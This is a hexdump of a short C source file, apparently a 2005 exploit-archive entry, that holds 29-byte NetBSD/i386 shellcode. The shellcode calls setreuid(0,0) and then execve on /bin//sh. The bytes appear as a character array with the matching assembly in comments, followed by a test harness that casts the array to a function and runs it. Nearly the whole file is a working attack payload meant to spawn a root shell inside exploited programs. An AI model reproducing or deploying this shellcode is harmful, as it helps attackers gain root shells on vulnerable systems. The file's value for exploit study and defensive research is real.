00000000  2f 2a 0d 0a 20 2a 20 20  6d 69 6e 65 72 76 69 6e  |/*.. *  minervin|
00000010  69 20 61 74 20 6e 65 75  72 61 6c 6e 6f 69 73 65  |i at neuralnoise|
00000020  20 64 6f 74 20 63 6f 6d  20 28 63 29 20 32 30 30  | dot com (c) 200|
00000030  35 0d 0a 20 2a 20 20 4e  65 74 42 53 44 2f 69 33  |5.. *  NetBSD/i3|
00000040  38 36 20 32 2e 30 2c 20  73 65 74 72 65 75 69 64  |86 2.0, setreuid|
00000050  28 30 2c 20 30 29 3b 20  65 78 65 63 76 65 28 22  |(0, 0); execve("|
00000060  2f 62 69 6e 2f 2f 73 68  22 2c 20 2e 2e 2e 2c 20  |/bin//sh", ..., |
00000070  4e 55 4c 4c 29 3b 0d 0a  20 2a 20 20 6e 6f 74 65  |NULL);.. *  note|
00000080  3a 20 75 6e 73 61 66 65  20 73 68 65 6c 6c 63 6f  |: unsafe shellco|
00000090  64 65 2c 20 62 75 74 20  32 39 20 62 79 74 65 73  |de, but 29 bytes|
000000a0  20 6c 6f 6e 67 3b 0d 0a  20 2a 20 20 09 20 20 64  | long;.. *  .  d|
000000b0  6f 65 73 6e 27 74 20 77  6f 72 6b 20 69 66 20 28  |oesn't work if (|
000000c0  65 61 78 20 26 20 30 78  34 30 30 30 30 30 30 30  |eax & 0x40000000|
000000d0  29 20 21 3d 20 30 3b 0d  0a 20 2a 2f 0d 0a 0d 0a  |) != 0;.. */....|
000000e0  23 69 6e 63 6c 75 64 65  20 22 73 79 73 2f 74 79  |#include "sys/ty|
000000f0  70 65 73 2e 68 22 0d 0a  23 69 6e 63 6c 75 64 65  |pes.h"..#include|
00000100  20 22 73 74 64 69 6f 2e  68 22 0d 0a 23 69 6e 63  | "stdio.h"..#inc|
00000110  6c 75 64 65 20 22 73 74  72 69 6e 67 2e 68 22 0d  |lude "string.h".|
00000120  0a 0d 0a 63 68 61 72 20  73 63 6f 64 65 5b 5d 20  |...char scode[] |
00000130  3d 0d 0a 20 20 22 5c 78  39 39 22 20 20 20 20 20  |=..  "\x99"     |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000150  20 63 6c 74 64 20 20 20  0d 0a 20 20 22 5c 78 35  | cltd   ..  "\x5|
00000160  32 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2"              |
00000170  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
00000180  65 64 78 0d 0a 20 20 22  5c 78 35 32 22 20 20 20  |edx..  "\x52"   |
00000190  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001a0  2f 2f 20 70 75 73 68 20  20 20 25 65 64 78 0d 0a  |// push   %edx..|
000001b0  20 20 22 5c 78 35 32 22  20 20 20 20 20 20 20 20  |  "\x52"        |
000001c0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
000001d0  73 68 20 20 20 25 65 64  78 0d 0a 20 20 22 5c 78  |sh   %edx..  "\x|
000001e0  36 61 5c 78 37 65 22 20  20 20 20 20 20 20 20 20  |6a\x7e"         |
000001f0  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000200  24 30 78 37 65 0d 0a 20  20 22 5c 78 35 38 22 20  |$0x7e..  "\x58" |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000220  20 20 2f 2f 20 70 6f 70  20 20 20 20 25 65 61 78  |  // pop    %eax|
00000230  0d 0a 20 20 22 5c 78 63  64 5c 78 38 30 22 20 20  |..  "\xcd\x80"  |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000250  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 20 20  |int    $0x80..  |
00000260  22 5c 78 36 38 5c 78 32  66 5c 78 32 66 5c 78 37  |"\x68\x2f\x2f\x7|
00000270  33 5c 78 36 38 22 20 20  20 2f 2f 20 70 75 73 68  |3\x68"   // push|
00000280  20 20 20 24 30 78 36 38  37 33 32 66 32 66 0d 0a  |   $0x68732f2f..|
00000290  20 20 22 5c 78 36 38 5c  78 32 66 5c 78 36 32 5c  |  "\x68\x2f\x62\|
000002a0  78 36 39 5c 78 36 65 22  20 20 20 2f 2f 20 70 75  |x69\x6e"   // pu|
000002b0  73 68 20 20 20 24 30 78  36 65 36 39 36 32 32 66  |sh   $0x6e69622f|
000002c0  0d 0a 20 20 22 5c 78 38  39 5c 78 65 33 22 20 20  |..  "\x89\xe3"  |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000002e0  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 62 78  |mov    %esp,%ebx|
000002f0  0d 0a 20 20 22 5c 78 35  32 22 20 20 20 20 20 20  |..  "\x52"      |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000310  70 75 73 68 20 20 20 25  65 64 78 0d 0a 20 20 22  |push   %edx..  "|
00000320  5c 78 35 34 22 20 20 20  20 20 20 20 20 20 20 20  |\x54"           |
00000330  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000340  20 20 25 65 73 70 0d 0a  20 20 22 5c 78 35 33 22  |  %esp..  "\x53"|
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000360  20 20 20 2f 2f 20 70 75  73 68 20 20 20 25 65 62  |   // push   %eb|
00000370  78 0d 0a 20 20 22 5c 78  35 32 22 20 20 20 20 20  |x..  "\x52"     |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000390  20 70 75 73 68 20 20 20  25 65 64 78 0d 0a 20 20  | push   %edx..  |
000003a0  22 5c 78 33 34 5c 78 33  62 22 20 20 20 20 20 20  |"\x34\x3b"      |
000003b0  20 20 20 20 20 20 20 20  20 2f 2f 20 78 6f 72 20  |         // xor |
000003c0  20 20 20 24 30 78 33 62  2c 25 61 6c 0d 0a 20 20  |   $0x3b,%al..  |
000003d0  22 5c 78 63 64 5c 78 38  30 22 3b 20 20 20 20 20  |"\xcd\x80";     |
000003e0  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
000003f0  20 20 20 24 30 78 38 30  0d 0a 0d 0a 69 6e 74 20  |   $0x80....int |
00000400  6d 61 69 6e 28 29 20 7b  0d 0a 20 20 20 76 6f 69  |main() {..   voi|
00000410  64 20 28 2a 63 6f 64 65  29 20 28 29 20 3d 20 28  |d (*code) () = (|
00000420  76 6f 69 64 20 2a 29 20  73 63 6f 64 65 3b 0d 0a  |void *) scode;..|
00000430  20 20 20 70 72 69 6e 74  66 28 22 6c 65 6e 67 74  |   printf("lengt|
00000440  68 3a 20 25 64 5c 6e 22  2c 20 73 74 72 6c 65 6e  |h: %d\n", strlen|
00000450  28 73 63 6f 64 65 29 29  3b 0d 0a 20 20 20 63 6f  |(scode));..   co|
00000460  64 65 28 29 3b 0d 0a 20  20 20 72 65 74 75 72 6e  |de();..   return|
00000470  20 28 30 29 3b 0d 0a 7d                           | (0);..}|
00000478
